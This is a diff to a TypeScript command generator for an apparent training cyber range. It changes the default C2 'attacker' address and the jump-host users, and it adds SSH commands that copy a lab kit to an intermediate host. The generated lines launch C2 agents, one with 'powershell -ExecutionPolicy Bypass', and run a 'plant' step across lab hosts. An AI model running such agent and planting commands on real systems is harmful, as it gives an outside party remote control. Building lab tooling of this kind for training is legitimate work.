@@ -134,7 +134,7 @@ export function linuxAgentCommand(cfg: BenchConfig) {
   const token = shQuote(tokenOrPlaceholder(cfg.token));
   return [
     "sudo python3 range.py agent",
-    `--c2 ${cfg.attacker.trim() || "10.0.0.10"}`,
+    `--c2 ${cfg.attacker.trim() || "10.50.160.9"}`,
     `--channel ${cfg.channel}`,
     `--token ${token}`,
     `--id ${sanitizeId(cfg.linuxId)}`,
@@ -150,7 +150,7 @@ export function windowsCommand(cfg: BenchConfig) {
     const quoted = shQuote(tokenOrPlaceholder(cfg.token));
     return [
       "python range.py agent",
-      `--c2 ${cfg.attacker.trim() || "10.0.0.10"}`,
+      `--c2 ${cfg.attacker.trim() || "10.50.160.9"}`,
       `--channel ${cfg.channel}`,
       `--token ${quoted}`,
       `--id ${sanitizeId(cfg.windowsId)}`,
@@ -160,7 +160,7 @@ export function windowsCommand(cfg: BenchConfig) {
   }
   return [
     "powershell -NoProfile -ExecutionPolicy Bypass -File .\\range-agent.ps1",
-    `-C2 ${cfg.attacker.trim() || "10.0.0.10"}`,
+    `-C2 ${cfg.attacker.trim() || "10.50.160.9"}`,
     `-Channel ${cfg.channel}`,
     `-Token ${token}`,
     `-Id ${sanitizeId(cfg.windowsId)}`,
@@ -202,7 +202,7 @@ export const DEFAULT_HOSTS: LabHost[] = [
 export type ShellChoice = "vi" | "python" | "perl";
 
 export const DEFAULT_CONFIG: BenchConfig = {
-  attacker: "10.0.0.10",
+  attacker: "10.50.160.9",
   token: "",
   linuxId: "web-nginx",
   windowsId: "win-82",
@@ -212,7 +212,7 @@ export const DEFAULT_CONFIG: BenchConfig = {
   webroot: "",
   jump1User: "cvte",
   jump1Host: "10.50.11.232",
-  jump2User: "cvte",
+  jump2User: "ocelot",
   jump2Host: "172.24.24.101",
   wanUser: "atropia_admin",
   student: "defender",
@@ -231,10 +231,7 @@ function sanitizeHostName(value: string) {
 export function hostsDocument(cfg: BenchConfig) {
   const wan = cfg.hosts.find((host) => host.id === "wan");
   return {
-    jumps: [
-      { name: "jump-a", user: cfg.jump1User.trim() || "cvte", host: cfg.jump1Host.trim(), port: 22 },
-      { name: "jump-b", user: cfg.jump2User.trim() || "cvte", host: cfg.jump2Host.trim(), port: 22 },
-    ],
+    jumps: [],
     hosts: cfg.hosts.map((host) => ({
       id: host.id,
       name: host.name,
@@ -253,9 +250,10 @@ export function hostsDocument(cfg: BenchConfig) {
 export function sshConfig(cfg: BenchConfig) {
   const doc = hostsDocument(cfg);
   const lines = [
-    "# Range lab path. Use with ssh -F. This file replaces proxychains.",
-    "# The first connection types the jump passwords and then keeps a master socket.",
-    "# ICMP does not fit in a SOCKS proxy. Ping from lab-wan, which is already on the lab.",
+    "# Range lab path. Run this on ocelot, not on the laptop.",
+    "# Ocelot reaches the WAN router directly. The laptop jump is not in this file.",
+    "# The first connection types the WAN password and then keeps a master socket.",
+    "# ICMP does not fit in a SOCKS proxy. Ping from lab-wan.",
     "Host *",
     "  ControlMaster auto",
     "  ControlPath ~/.ssh/range-cm-%C",
@@ -266,15 +264,6 @@ export function sshConfig(cfg: BenchConfig) {
     "",
   ];
   let previous = "";
-  doc.jumps.forEach((jump) => {
-    lines.push(`Host ${jump.name}`);
-    lines.push(`  HostName ${jump.host}`);
-    lines.push(`  User ${jump.user}`);
-    lines.push(`  Port ${jump.port}`);
-    if (previous) lines.push(`  ProxyJump ${previous}`);
-    lines.push("");
-    previous = jump.name;
-  });
   const wan = doc.hosts.find((host) => host.name === "wan" || host.id === "wan");
   const others = doc.hosts.filter((host) => host !== wan);
   if (wan) {
@@ -303,7 +292,7 @@ export function keysCommand() {
 
 export function plantCommand(cfg: BenchConfig) {
   const token = shQuote(tokenOrPlaceholder(cfg.token));
-  const c2 = cfg.attacker.trim() || "10.0.0.10";
+  const c2 = cfg.attacker.trim() || "10.50.160.9";
   return [
     "python3 range.py plant",
     "--hosts range-hosts.json",
@@ -323,6 +312,21 @@ export function plantCommand(cfg: BenchConfig) {
 
 export function openTunnelCommand() {
   return "ssh -F range-ssh.conf lab-wan";
+}
+
+export function reachOcelotCommand(cfg: BenchConfig) {
+  const jump = `${cfg.jump1User.trim() || "cvte"}@${cfg.jump1Host.trim() || "10.50.11.232"}`;
+  const dest = `${cfg.jump2User.trim() || "ocelot"}@${cfg.jump2Host.trim() || "172.24.24.101"}`;
+  return `ssh -J ${jump} ${dest}`;
+}
+
+export function copyKitCommand(cfg: BenchConfig) {
+  const jump = `${cfg.jump1User.trim() || "cvte"}@${cfg.jump1Host.trim() || "10.50.11.232"}`;
+  const dest = `${cfg.jump2User.trim() || "ocelot"}@${cfg.jump2Host.trim() || "172.24.24.101"}`;
+  return [
+    `ssh -J ${jump} ${dest} 'mkdir -p range-lab'`,
+    `scp -o ProxyJump=${jump} range.py range-agent.ps1 range-hosts.json range-ssh.conf ${dest}:range-lab/`,
+  ].join("\n");
 }
 
 export function pingCommand(address: string) {
@@ -383,7 +387,10 @@ export function normalizeConfig(saved: Partial<BenchConfig> | null | undefined):
     return host;
   });
   const timing = saved?.timing === "off" ? "off" : "continuous";
-  return { ...DEFAULT_CONFIG, ...saved, shell, hosts, timing };
+  const attacker = !saved?.attacker || saved.attacker === "10.0.0.10" ? DEFAULT_CONFIG.attacker : saved.attacker;
+  const jump2Host = saved?.jump2Host || DEFAULT_CONFIG.jump2Host;
+  const jump2User = saved?.jump2User === "cvte" && jump2Host === "172.24.24.101" ? "ocelot" : saved?.jump2User || DEFAULT_CONFIG.jump2User;
+  return { ...DEFAULT_CONFIG, ...saved, shell, hosts, timing, attacker, jump2User, jump2Host };
 }
 
 export function zipStore(files: { name: string; data: Uint8Array }[]) {
